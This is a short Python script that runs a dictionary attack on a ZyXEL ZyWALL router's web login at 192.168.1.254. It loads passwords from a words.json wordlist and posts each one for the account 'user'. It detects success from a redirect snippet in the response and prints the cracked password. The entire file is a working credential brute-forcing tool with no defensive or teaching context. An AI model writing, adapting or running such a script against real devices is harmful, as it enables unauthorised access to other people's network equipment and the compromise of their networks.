import requests
import os
import random
import string
import json

target_url = 'http://192.168.1.254/login.cgi'
target_username = 'user'
if_contains_then_valid = ['<script>window.location="indexMain.cgi"</script>']
if_contains_then_invalid = []

def post_it(password):

    # password = password.lower()
    # password = string.ascii_letters + string.digits
    # password = (os.urandom(1024))
    # password = password.join(random.choice(string.digits)) // Salt
    # password = password.join(random.choice(chars) for i in range(8))

    response = requests.post(target_url, allow_redirects=False, data={
    	'UserName': target_username,
        'loginPassword': "ZyXEL ZyWALL Series",
        'submitValue': "1",
    	'hiddenPassword': password,
        'Submit': "Login"
    })
    
    print('testing password '+password+' on '+target_username)
    contains_valid = any(if_contain_then_valid in str(response.content) for if_contain_then_valid in if_contains_then_valid)
    contains_invalid = any(if_contain_then_invalid in str(response.content) for if_contain_then_invalid in if_contains_then_invalid)
    
    if contains_valid and not contains_invalid:
        print("[+] {}s password is {}".format(target_username, password))
        exit(0)

if __name__ == "__main__":
    passwords = json.loads(open('words.json').read())
    for password in passwords:
      post_it(password)
